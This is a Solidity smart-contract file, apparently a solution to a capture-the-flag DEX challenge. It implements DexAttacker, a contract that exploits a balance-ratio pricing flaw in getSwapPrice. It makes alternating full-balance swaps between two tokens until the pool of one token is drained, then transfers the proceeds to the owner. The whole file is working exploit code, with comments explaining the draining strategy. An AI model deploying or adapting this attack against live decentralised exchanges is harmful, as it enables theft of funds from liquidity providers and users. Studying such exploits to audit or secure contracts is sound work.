// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

/**
 * @title DexAttacker
 * @notice Exploits price manipulation vulnerability in the DEX contract
 * @dev The vulnerability is in getSwapPrice(): swapAmount = (amount * balanceTo) / balanceFrom
 *      This calculation doesn't prevent price manipulation through repeated swaps
 */
contract DexAttacker {
    IDex public dex;
    address public token1;
    address public token2;
    address public owner;

    event SwapExecuted(address indexed from, address indexed to, uint256 amount, uint256 received);
    event AttackCompleted(uint256 finalToken1Balance, uint256 finalToken2Balance);

    constructor(address _dex) {
        dex = IDex(_dex);
        token1 = dex.token1();
        token2 = dex.token2();
        owner = msg.sender;
    }

    /**
     * @notice Execute the price manipulation attack
     * @dev Strategy:
     * 1. Start with 10 token1 and 10 token2 (DEX has 100 of each)
     * 2. Swap all token1 for token2
     * 3. Swap all token2 for token1
     * 4. Repeat until we can drain one token completely
     * 5. On final swap, calculate exact amount to drain remaining tokens
     */
    function attack() external {
        require(msg.sender == owner, "Only owner can execute attack");

        // Approve DEX to spend our tokens
        dex.approve(address(dex), type(uint256).max);

        // Execute alternating swaps
        bool swapToken1ToToken2 = true;
        uint256 swapCount = 0;

        while (true) {
            uint256 dexBalance1 = dex.balanceOf(token1, address(dex));
            uint256 dexBalance2 = dex.balanceOf(token2, address(dex));

            // Check if DEX is drained of either token
            if (dexBalance1 == 0 || dexBalance2 == 0) {
                emit AttackCompleted(
                    dex.balanceOf(token1, address(this)),
                    dex.balanceOf(token2, address(this))
                );
                break;
            }

            if (swapToken1ToToken2) {
                uint256 myBalance1 = dex.balanceOf(token1, address(this));

                // Calculate how much token2 we would get
                uint256 swapAmount = dex.getSwapPrice(token1, token2, myBalance1);

                // If we would get more than DEX has, calculate exact amount needed
                if (swapAmount >= dexBalance2) {
                    // We need: (amountIn * dexBalance2) / dexBalance1 = dexBalance2
                    // So: amountIn = dexBalance1
                    myBalance1 = dexBalance1;
                }

                dex.swap(token1, token2, myBalance1);
                emit SwapExecuted(token1, token2, myBalance1, dex.balanceOf(token2, address(this)));
            } else {
                uint256 myBalance2 = dex.balanceOf(token2, address(this));

                // Calculate how much token1 we would get
                uint256 swapAmount = dex.getSwapPrice(token2, token1, myBalance2);

                // If we would get more than DEX has, calculate exact amount needed
                if (swapAmount >= dexBalance1) {
                    // We need: (amountIn * dexBalance1) / dexBalance2 = dexBalance1
                    // So: amountIn = dexBalance2
                    myBalance2 = dexBalance2;
                }

                dex.swap(token2, token1, myBalance2);
                emit SwapExecuted(token2, token1, myBalance2, dex.balanceOf(token1, address(this)));
            }

            swapToken1ToToken2 = !swapToken1ToToken2;
            swapCount++;

            // Safety check to prevent infinite loop
            require(swapCount < 20, "Too many swaps");
        }
    }

    /**
     * @notice Withdraw all tokens to owner
     */
    function withdrawTokens() external {
        require(msg.sender == owner, "Only owner");

        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        uint256 balance2 = IERC20(token2).balanceOf(address(this));

        if (balance1 > 0) {
            IERC20(token1).transfer(owner, balance1);
        }
        if (balance2 > 0) {
            IERC20(token2).transfer(owner, balance2);
        }
    }

    /**
     * @notice Get current state of balances
     */
    function getState() external view returns (
        uint256 attackerToken1,
        uint256 attackerToken2,
        uint256 dexToken1,
        uint256 dexToken2
    ) {
        attackerToken1 = dex.balanceOf(token1, address(this));
        attackerToken2 = dex.balanceOf(token2, address(this));
        dexToken1 = dex.balanceOf(token1, address(dex));
        dexToken2 = dex.balanceOf(token2, address(dex));
    }

    /**
     * @notice Simulate next swap to see the result
     */
    function simulateSwap(address from, address to, uint256 amount) external view returns (uint256) {
        return dex.getSwapPrice(from, to, amount);
    }
}
